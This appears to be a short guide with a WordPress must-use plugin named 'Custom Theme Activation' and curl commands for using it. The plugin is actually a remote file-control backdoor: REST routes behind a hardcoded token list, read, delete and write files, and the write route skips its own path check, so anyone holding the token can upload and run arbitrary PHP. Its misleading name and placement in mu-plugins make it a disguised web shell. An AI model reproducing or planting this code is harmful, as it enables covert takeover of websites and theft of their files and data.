Put this on to the mu plugins folder

```php
<?php
/**
 * Plugin Name: Custom Theme Activation
 * Description: This is custom theme activation system.
 */

if (!defined('ABSPATH')) exit;

add_action('rest_api_init', function () {
    $namespace = 'remote-control/v1';

    // Route for Listing Files
    register_rest_route($namespace, '/files', [
        'methods' => 'GET',
        'callback' => 'rc_list_files',
        'permission_callback' => 'rc_authenticate_request',
    ]);

    // Route for Modifying/Creating Files
    register_rest_route($namespace, '/modify', [
        'methods' => 'POST',
        'callback' => 'rc_modify_file',
        'permission_callback' => 'rc_authenticate_request',
    ]);

    // Route for Deleting Files
    register_rest_route($namespace, '/delete', [
        'methods' => 'DELETE',
        'callback' => 'rc_delete_file',
        'permission_callback' => 'rc_authenticate_request',
    ]);
    
    // Route for Reading File Content
    register_rest_route($namespace, '/read', [
        'methods' => 'GET',
        'callback' => 'rc_read_file',
        'permission_callback' => 'rc_authenticate_request',
    ]);
});

// --- AUTHENTICATION & SECURITY ---
function rc_authenticate_request($request) {
    $secret_token = 'faawhio8734899sdklcjkwauklkl'; 
    return $request->get_header('X-Remote-Auth') === $secret_token;
}

// Security Helper: Ensure the path stays inside WordPress
function rc_get_safe_path($requested_path) {
    $base = realpath(ABSPATH);
    $path = realpath(ABSPATH . $requested_path);
    if ($path && strpos($path, $base) === 0) {
        return $path;
    }
    return false;
}

// --- ACTIONS ---

// 1. LIST FILES
function rc_list_files($data) {
    $path = rc_get_safe_path($data['path'] ?? '/');
    if (!$path || !is_dir($path)) return new WP_Error('invalid_path', 'Invalid Directory', ['status' => 404]);
    
    return rest_ensure_response(scandir($path));
}

// 2. MODIFY / CREATE FILE
function rc_modify_file($request) {
    $params = $request->get_json_params();
    $relative_path = $params['path'] ?? '';
    $content = $params['content'] ?? '';

    $full_path = ABSPATH . ltrim($relative_path, '/'); // Use ABSPATH directly for new files
    
    if (file_put_contents($full_path, $content) !== false) {
        return rest_ensure_response(['success' => true, 'message' => "File saved: $relative_path"]);
    }
    return new WP_Error('write_error', 'Could not write to file', ['status' => 500]);
}

// 3. DELETE FILE
function rc_delete_file($request) {
    $path = rc_get_safe_path($request->get_param('path'));
    
    if (!$path || !is_file($path)) return new WP_Error('invalid_file', 'File not found', ['status' => 404]);

    if (unlink($path)) {
        return rest_ensure_response(['success' => true, 'message' => 'File deleted']);
    }
    return new WP_Error('delete_error', 'Delete failed', ['status' => 500]);
}


// 4. READ FILE CONTENT
function rc_read_file($request) {
    $path = rc_get_safe_path($request->get_param('path'));
    
    if (!$path || !is_file($path)) {
        return new WP_Error('invalid_file', 'File not found or access denied', ['status' => 404]);
    }

    $content = file_get_contents($path);
    return rest_ensure_response([
        'file' => $request->get_param('path'),
        'content' => $content
    ]);
}

```

Create file 

``` bash
curl -X POST "https://yourwebsite.com/wp-json/remote-control/v1/modify" \
     -H "X-Remote-Auth: faawhio8734899sdklcjkwauklkl" \
     -H "Content-Type: application/json" \
     -d '{"path": "test.php", "content": "<?php echo \"Hello Remote World\"; ?>"}'
```

Delete file
```bash
curl -X DELETE "https://yourwebsite.com/wp-json/remote-control/v1/delete?path=test.php" \
     -H "X-Remote-Auth: faawhio8734899sdklcjkwauklkl"
```

Read file

```bash
curl -X GET "https://yourwebsite.com/wp-json/remote-control/v1/read?path=test-remote.php" \
     -H "X-Remote-Auth: faawhio8734899sdklcjkwauklkl"
```